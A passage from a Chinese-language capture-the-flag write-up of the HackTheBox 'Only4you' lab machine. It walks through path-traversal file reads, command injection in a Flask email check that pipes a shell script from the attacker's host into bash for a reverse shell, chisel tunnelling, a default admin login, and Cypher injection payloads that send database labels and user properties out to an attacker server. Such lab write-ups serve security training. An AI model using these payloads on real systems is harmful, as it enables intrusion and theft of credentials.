<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://beta.only4you.htb/download --data <span class="hljs-string">&quot;image=/var/log/nginx/error.log&quot;</span><br>2023/07/24 03:06:32 [error] 1047<span class="hljs-comment">#1047: *11 upstream prematurely closed connection while reading response header from upstream, client: 10.10.14.6, server: only4you.htb, request: &quot;POST / HTTP/1.1&quot;, upstream: &quot;http://unix:/var/www/only4you.htb/only4you.sock:/&quot;, host: &quot;only4you.htb&quot;</span><br>2023/07/24 03:42:25 [error] 1047<span class="hljs-comment">#1047: *489 upstream prematurely closed connection while reading response header from upstream, client: 10.10.14.238, server: only4you.htb, request: &quot;POST / HTTP/1.1&quot;, upstream: &quot;http://unix:/var/www/only4you.htb/only4you.sock:/&quot;, host: &quot;only4you.htb&quot;, referrer: &quot;http://only4you.htb/&quot;</span><br></code></pre></td></tr></table></figure>

<p>提供了我们最需要的路径<code>/var/www/only4you.htb/</code>。那我们就可以看看主站的源代码了。</p>
<p>然而主站使用什么写的呢？php？aspx？其实要index.php这样一个一个试也可以，但是我们刚才可以发现beta网站和主站风格是相似的，如果beta用python写的，主站也用python写的概率是极大的。那我们试试默认网页app.py看看能不能读取。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://beta.only4you.htb/download --data <span class="hljs-string">&quot;image=/var/www/only4you.htb/app.py&quot;</span><br>from flask import Flask, render_template, request, flash, redirect<br>from form import sendmessage<br>import uuid<br><br>app = Flask(__name__)<br>app.secret_key = uuid.uuid4().hex<br><br>@app.route(<span class="hljs-string">&#x27;/&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>])<br>def index():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        email = request.form[<span class="hljs-string">&#x27;email&#x27;</span>]<br>        subject = request.form[<span class="hljs-string">&#x27;subject&#x27;</span>]<br>        message = request.form[<span class="hljs-string">&#x27;message&#x27;</span>]<br>        ip = request.remote_addr<br><br>        status = sendmessage(email, subject, message, ip)<br>        <span class="hljs-keyword">if</span> status == 0:<br>            flash(<span class="hljs-string">&#x27;Something went wrong!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>        <span class="hljs-keyword">elif</span> status == 1:<br>            flash(<span class="hljs-string">&#x27;You are not authorized!&#x27;</span>, <span class="hljs-string">&#x27;danger&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            flash(<span class="hljs-string">&#x27;Your message was successfuly sent! We will reply as soon as possible.&#x27;</span>, <span class="hljs-string">&#x27;success&#x27;</span>)<br>        <span class="hljs-built_in">return</span> redirect(<span class="hljs-string">&#x27;/#contact&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br>@app.errorhandler(404)<br>def page_not_found(error):<br>    <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;404.html&#x27;</span>), 404<br><br>@app.errorhandler(500)<br>def server_errorerror(error):<br>    <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;500.html&#x27;</span>), 500<br><br>@app.errorhandler(400)<br>def bad_request(error):<br>    <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;400.html&#x27;</span>), 400<br><br>@app.errorhandler(405)<br>def method_not_allowed(error):<br>    <span class="hljs-built_in">return</span> render_template(<span class="hljs-string">&#x27;405.html&#x27;</span>), 405<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;127.0.0.1&#x27;</span>, port=80, debug=False)<br></code></pre></td></tr></table></figure>

<p>发现竟然还真是。</p>
<p>我们看一下代码就会发现其实没啥内容，主要实现的功能就一个<code>sendmessage</code>功能，也就是主页那个发送消息的框。</p>
<p class='item-img' data-src='/pic/assets/f12f38902e44b075f2ca3dd0592012e9.png'><img src="/pic/assets/f12f38902e44b075f2ca3dd0592012e9.png" alt="f12f38902e44b075f2ca3dd0592012e9"></p>
<p>之前其实手动尝试过是否存在sql注入漏洞啥的，并没什么发现，那我们研究下其具体实现看看有无可以利用的点吧。然而app.py并没其具体实现，我们看其实从<code>form</code>中import来的，显然<code>form</code>明显不是一个标准的python库，那说明其是一个同目录下的单独的py文件。那我们看看其代码。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://beta.only4you.htb/download --data <span class="hljs-string">&quot;image=/var/www/only4you.htb/form.py&quot;</span><br>import smtplib, re<br>from email.message import EmailMessage<br>from subprocess import PIPE, run<br>import ipaddress<br><br>def issecure(email, ip):<br>        <span class="hljs-keyword">if</span> not re.match(<span class="hljs-string">&quot;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]&#123;2,&#125;)&quot;</span>, email):<br>                <span class="hljs-built_in">return</span> 0<br>        <span class="hljs-keyword">else</span>:<br>                domain = email.split(<span class="hljs-string">&quot;@&quot;</span>, 1)[1]<br>                result = run([f<span class="hljs-string">&quot;dig txt &#123;domain&#125;&quot;</span>], shell=True, stdout=PIPE)<br>                output = result.stdout.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;v=spf1&quot;</span> not <span class="hljs-keyword">in</span> output:<br>                        <span class="hljs-built_in">return</span> 1<br>                <span class="hljs-keyword">else</span>:<br>                        domains = []<br>                        ips = []<br>                        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;include:&quot;</span> <span class="hljs-keyword">in</span> output:<br>                                dms = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(re.findall(r<span class="hljs-string">&quot;include:.*\.[A-Z|a-z]&#123;2,&#125;&quot;</span>, output)).<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;include:&quot;</span>)<br>                                dms.pop(0)<br>                                <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> dms:<br>                                        domains.append(domain)<br>                                <span class="hljs-keyword">while</span> True:<br>                                        <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> domains:<br>                                                result = run([f<span class="hljs-string">&quot;dig txt &#123;domain&#125;&quot;</span>], shell=True, stdout=PIPE)<br>                                                output = result.stdout.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                                                <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;include:&quot;</span> <span class="hljs-keyword">in</span> output:<br>                                                        dms = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(re.findall(r<span class="hljs-string">&quot;include:.*\.[A-Z|a-z]&#123;2,&#125;&quot;</span>, output)).<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;include:&quot;</span>)<br>                                                        domains.clear()<br>                                                        <span class="hljs-keyword">for</span> domain <span class="hljs-keyword">in</span> dms:<br>                                                                domains.append(domain)<br>                                                <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;ip4:&quot;</span> <span class="hljs-keyword">in</span> output:<br>                                                        ipaddresses = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(re.findall(r<span class="hljs-string">&quot;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]&#123;2&#125;&quot;</span>, output)).<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;ip4:&quot;</span>)<br>                                                        ipaddresses.pop(0)<br>                                                        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ipaddresses:<br>                                                                ips.append(i)<br>                                                <span class="hljs-keyword">else</span>:<br>                                                        pass<br>                                        <span class="hljs-built_in">break</span><br>                        <span class="hljs-keyword">elif</span> <span class="hljs-string">&quot;ip4&quot;</span> <span class="hljs-keyword">in</span> output:<br>                                ipaddresses = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-built_in">join</span>(re.findall(r<span class="hljs-string">&quot;ip4:+[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+[/]?[0-9]&#123;2&#125;&quot;</span>, output)).<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot;ip4:&quot;</span>)<br>                                ipaddresses.pop(0)<br>                                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ipaddresses:<br>                                        ips.append(i)<br>                        <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">return</span> 1<br>                <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> ips:<br>                        <span class="hljs-keyword">if</span> ip == i:<br>                                <span class="hljs-built_in">return</span> 2<br>                        <span class="hljs-keyword">elif</span> ipaddress.ip_address(ip) <span class="hljs-keyword">in</span> ipaddress.ip_network(i):<br>                                <span class="hljs-built_in">return</span> 2<br>                        <span class="hljs-keyword">else</span>:<br>                                <span class="hljs-built_in">return</span> 1<br><br>def sendmessage(email, subject, message, ip):<br>        status = issecure(email, ip)<br>        <span class="hljs-keyword">if</span> status == 2:<br>                msg = EmailMessage()<br>                msg[<span class="hljs-string">&#x27;From&#x27;</span>] = f<span class="hljs-string">&#x27;&#123;email&#125;&#x27;</span><br>                msg[<span class="hljs-string">&#x27;To&#x27;</span>] = <span class="hljs-string">&#x27;info@only4you.htb&#x27;</span><br>                msg[<span class="hljs-string">&#x27;Subject&#x27;</span>] = f<span class="hljs-string">&#x27;&#123;subject&#125;&#x27;</span><br>                msg[<span class="hljs-string">&#x27;Message&#x27;</span>] = f<span class="hljs-string">&#x27;&#123;message&#125;&#x27;</span><br><br>                smtp = smtplib.SMTP(host=<span class="hljs-string">&#x27;localhost&#x27;</span>, port=25)<br>                smtp.send_message(msg)<br>                smtp.quit()<br>                <span class="hljs-built_in">return</span> status<br>        <span class="hljs-keyword">elif</span> status == 1:<br>                <span class="hljs-built_in">return</span> status<br>        <span class="hljs-keyword">else</span>:<br>                <span class="hljs-built_in">return</span> status<br></code></pre></td></tr></table></figure>

<p>确实如此。</p>
<h3 id="代码审计2-0"><a href="#代码审计2-0" class="headerlink" title="代码审计2.0"></a>代码审计2.0</h3><p>我们需要重点关注的是这一部分。主要其中的<code>run(shell=True)</code>函数很吸引我们。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.<span class="hljs-keyword">match</span>(<span class="hljs-string">&quot;([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]&#123;2,&#125;)&quot;</span>, email):<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span><br><span class="hljs-keyword">else</span>:<br>        domain = email.split(<span class="hljs-string">&quot;@&quot;</span>, <span class="hljs-number">1</span>)[<span class="hljs-number">1</span>]<br>        result = run([<span class="hljs-string">f&quot;dig txt <span class="hljs-subst">&#123;domain&#125;</span>&quot;</span>], shell=<span class="hljs-literal">True</span>, stdout=PIPE)<br>        output = result.stdout.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;v=spf1&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> output:<br>                <span class="hljs-keyword">return</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>

<p>在Python中，<code>run([f&quot;&quot;], shell=True, stdout=PIPE)</code> 是用于执行外部命令的一种方法。这是通过<code>subprocess</code>模块的<code>run()</code>函数来实现的。</p>
<p>我们发现，函数对domain的处理是将通过@将邮箱两部分分离，取后一部分运行<code>dig</code>命令。很显然这里存在代码注入的问题，因为我们只要构造类似<code>xxx@xxx.xxx;payload</code>的payload就能既绕过过滤又可以进行RCE拿shell了。</p>
<p>如果你说这里代码审计分析好难分析不出来怎么办？问chatgpt呗。</p>
<p class='item-img' data-src='/pic/assets/ca5f0a4ac6dfa7fb34d2bec69538348c.png'><img src="/pic/assets/ca5f0a4ac6dfa7fb34d2bec69538348c.png" alt="ca5f0a4ac6dfa7fb34d2bec69538348c"></p>
<p>善用工具就能很好实现我们的目标。</p>
<h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>我们先尝试了最喜欢<code>bash -i</code>以及<code>nc</code>，但是就算url编码了还是不能成功get shell，估计和<code>&amp;</code>这些符号有关，但是我们其实还可以用curl来反弹shell。我们先写好shell.sh，再在本地用python开一个简单的http server 。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://only4you.htb/ --data <span class="hljs-string">&quot;name=111&amp;email=1%401.com;curl &lt;HTB_VPN_IP&gt;:8888/shell.sh | sh&amp;subject=111&amp;message=111&quot;</span><br>&lt;!doctype html&gt;<br>&lt;html lang=en&gt;<br>&lt;title&gt;Redirecting...&lt;/title&gt;<br>&lt;h1&gt;Redirecting...&lt;/h1&gt;<br>&lt;p&gt;You should be redirected automatically to the target URL: &lt;a href=<span class="hljs-string">&quot;/#contact&quot;</span>&gt;/<span class="hljs-comment">#contact&lt;/a&gt;. If not, click the link.</span><br></code></pre></td></tr></table></figure>

<p>我们服务器确实接受到了请求，但是为啥没收到shell？难道是没有sh的原因？很怪，我们试试bash执行。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ curl http://only4you.htb/ --data <span class="hljs-string">&quot;name=111&amp;email=1%401.com;curl &lt;HTB_VPN_IP&gt;:8888/shell.sh | bash&amp;subject=111&amp;message=111&quot;</span><br></code></pre></td></tr></table></figure>

<p>这次成功拿到了反弹shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ sudo nc -nlvp 4444<br>listening on [any] 4444 ...<br>connect to [&lt;HTB_VPN_IP&gt;] from (UNKNOWN) [10.10.11.210] 47256<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (1013): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@only4you:~/only4you.htb$<br></code></pre></td></tr></table></figure>

<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="内网服务发现"><a href="#内网服务发现" class="headerlink" title="内网服务发现"></a>内网服务发现</h3><p>然而拿到shell只能说迈出了第一步，这个www-data哪怕有点权限也不会一点也没有，拿不到user flag，只能考虑先提权到用户权限再说了。</p>
<p>四处看了看也没找到啥提权的好途径，上linpeas看看。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">╔══════════╣ Active Ports<br>╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="hljs-comment">#open-ports</span><br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1040/nginx: worker<br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -<br>tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -<br>tcp6       0      0 :::22                   :::*                    LISTEN      -<br>tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -<br></code></pre></td></tr></table></figure>

<p>除了发现本地还开了很多其他端口以外，其他的东西都没啥入手点。我们先细看一下都有哪些端口在lisaten状态。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@only4you:~/only4you.htb$ netstat -natp<br>netstat -natp<br>Active Internet connections (servers and established)<br>Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name<br>tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1040/nginx: worker<br>tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -<br>tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:8001          0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -<br>tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -<br>tcp        0     14 10.10.11.210:40060      &lt;HTB_VPN_IP&gt;:4444        ESTABLISHED 1257/bash<br>tcp        0      1 10.10.11.210:44060      8.8.8.8:53              SYN_SENT    -<br>tcp6       0      0 127.0.0.1:7474          :::*                    LISTEN      -<br>tcp6       0      0 :::22                   :::*                    LISTEN      -<br>tcp6       0      0 127.0.0.1:7687          :::*                    LISTEN      -<br></code></pre></td></tr></table></figure>

<p>其中3000和8001都不知道是啥，3306和33060明显是mysql的端口,7474和7687都是<code>neo4j</code>的端口，但这些都是默认情况下的，具体是不是还得我们自己确认。</p>
<p>由于这些服务都跑在内网里，所以我们要先进行内网穿透，可以用<code>chisel</code>或者<code>frp</code>都可以，frp要自己手动写一下配置文件，我懒得写，这里就用chisel了，比较方便。</p>
<p>在本机起一个服务端。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ ./chisel server -p 8000 --reverse<br>2023/07/24 04:49:59 server: Reverse tunnelling enabled<br>2023/07/24 04:49:59 server: Fingerprint XMxZkZvd1PTuA20hOGgOyRF36iBDf9cR5dxT/zr0eBc=<br>2023/07/24 04:49:59 server: Listening on http://0.0.0.0:8000<br></code></pre></td></tr></table></figure>

<p>在靶机上起客户端转发。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@only4you:/tmp$ ./chisel client &lt;HTB_VPN_IP&gt;:8000 R:3000:127.0.0.1:3000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474 &amp;<br>&lt;:3000 R:8001:127.0.0.1:8001 R:7474:127.0.0.1:7474 &amp;<br>[1] 18440<br></code></pre></td></tr></table></figure>

<p>收到了连接。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">2023/07/24 04:50:32 server: session#1: tun: proxy#R:3000=&gt;3000: Listening<br>2023/07/24 04:50:32 server: session#1: tun: proxy#R:8001=&gt;8001: Listening<br>2023/07/24 04:50:32 server: session#1: tun: proxy#R:7474=&gt;7474: Listening<br></code></pre></td></tr></table></figure>

<p>然后我们打开浏览器就可以正常访问这些内网服务了。</p>
<p>3000端口：</p>
<p class='item-img' data-src='/pic/assets/99b692903e8f260775f8a6132ea01afe.png'><img src="/pic/assets/99b692903e8f260775f8a6132ea01afe.png" alt="99b692903e8f260775f8a6132ea01afe"></p>
<p>3000端口上跑的服务是Gogs，有点类似github。我们直接在登录页面尝试弱密码，没得手。</p>
<p>7474端口：</p>
<p class='item-img' data-src='/pic/assets/a98e0e747eaa2ad7839539e6a91d7553.png'><img src="/pic/assets/a98e0e747eaa2ad7839539e6a91d7553.png" alt="a98e0e747eaa2ad7839539e6a91d7553"></p>
<p>7474端口如预料的一样跑的是neo4j的数据库web管理页面。试着登录没成功。</p>
<p>8001端口：</p>
<p class='item-img' data-src='/pic/assets/cf007b7a66ac38df47aa1ca069b068d5.png'><img src="/pic/assets/cf007b7a66ac38df47aa1ca069b068d5.png" alt="cf007b7a66ac38df47aa1ca069b068d5"></p>
<p>直接就是一个登录页面，试着登录，成功了？我们用<code>admin:admin</code>的弱密码成功登录了。</p>
<p class='item-img' data-src='/pic/assets/e655af8cc9081afbc0dcf681b55b639d.png'><img src="/pic/assets/e655af8cc9081afbc0dcf681b55b639d.png" alt="e655af8cc9081afbc0dcf681b55b639d"></p>
<p>然后就是这么一个页面，不知道有啥用。但是我们看一下task那里，我们发现说是数据库迁移成了neo4j，很合理，毕竟7687就跑着neo4j的服务呢。我们再看看employees页面，发现有个搜索框。</p>
<p class='item-img' data-src='/pic/assets/567b57c3eadb3653b11e53516a3f3726.png'><img src="/pic/assets/567b57c3eadb3653b11e53516a3f3726.png" alt="567b57c3eadb3653b11e53516a3f3726"></p>
<p>既然都是数据库，neo4j有没有注入漏洞呢？我们直接谷歌查一下<code>neo4j injection</code>,发现喜闻乐见的还真有。<a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/sql-injection/cypher-injection-neo4j">HackTricks</a>上就有详细介绍，neo4j的注入叫Cypher Injection。</p>
<h3 id="Cypher-Injection"><a href="#Cypher-Injection" class="headerlink" title="Cypher Injection"></a>Cypher Injection</h3><p>我们照着来，本地开一个http服务器监听。</p>
<p>先查版本:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cypher">&#x27; OR 1=1 WITH 1 as a CALL dbms.components() YIELD name, versions, edition UNWIND versions as version LOAD CSV FROM &#x27;http://&lt;HTB_VPN_IP&gt;:7777/?version=&#x27; + version + &#x27;&amp;name=&#x27; + name + &#x27;&amp;edition=&#x27; + edition as l RETURN 0 as _0 //<br></code></pre></td></tr></table></figure>

<p>直接丢就搜索框查就行，如果要用burpsuite或者firefox的编辑重发，记得URL编码一下。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ python3 -m http.server 7777<br>Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...<br>10.10.11.210 - - [24/Jul/2023 05:22:55] code 400, message Bad request syntax (<span class="hljs-string">&#x27;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&#x27;</span>)<br>10.10.11.210 - - [24/Jul/2023 05:22:55] <span class="hljs-string">&quot;GET /?version=5.6.0&amp;name=Neo4j Kernel&amp;edition=community HTTP/1.1&quot;</span> 400 -<br></code></pre></td></tr></table></figure>

<p>发现能成功接收到返回。</p>
<p>再查一下标签（类似mysql中的表概念）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cypher">&#x27;&#125;) RETURN 0 as _0 UNION CALL db.labels() yield label LOAD CSV FROM &#x27;http://&lt;HTB_VPN_IP&gt;:7777/?l=&#x27;+label as l RETURN 0 as _0 <br></code></pre></td></tr></table></figure>

<p>我们直接照抄发现没反应，观察一下与第一个的区别，怀疑是闭合的问题，我们照着第一个请求改一下。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cypher">&#x27; OR 1=1 WITH 1 as a CALL db.labels() yield label LOAD CSV FROM &#x27;http://&lt;HTB_VPN_IP&gt;:7777/?l=&#x27;+label as l RETURN 0 as _0 //<br></code></pre></td></tr></table></figure>

<p>OK了。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">10.10.11.210 - - [24/Jul/2023 05:33:09] <span class="hljs-string">&quot;GET /?l=user HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:09] <span class="hljs-string">&quot;GET /?l=employee HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:09] <span class="hljs-string">&quot;GET /?l=user HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:09] <span class="hljs-string">&quot;GET /?l=employee HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:09] <span class="hljs-string">&quot;GET /?l=user HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:09] <span class="hljs-string">&quot;GET /?l=employee HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:09] <span class="hljs-string">&quot;GET /?l=user HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:10] <span class="hljs-string">&quot;GET /?l=employee HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:10] <span class="hljs-string">&quot;GET /?l=user HTTP/1.1&quot;</span> 200 -<br>10.10.11.210 - - [24/Jul/2023 05:33:10] <span class="hljs-string">&quot;GET /?l=employee HTTP/1.1&quot;</span> 200 <br></code></pre></td></tr></table></figure>

<p>有两个label我们肯定更想查user，看看有无其他用户的登录凭证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cypher">&#x27; OR 1=1 WITH 1 as a MATCH (f:user) UNWIND keys(f) as p LOAD CSV FROM &#x27;http://10.10.14.96:7777/?&#x27; + p +&#x27;=&#x27;+toString(f[p]) as l RETURN 0 as _0 //<br></code></pre></td></tr></table></figure>

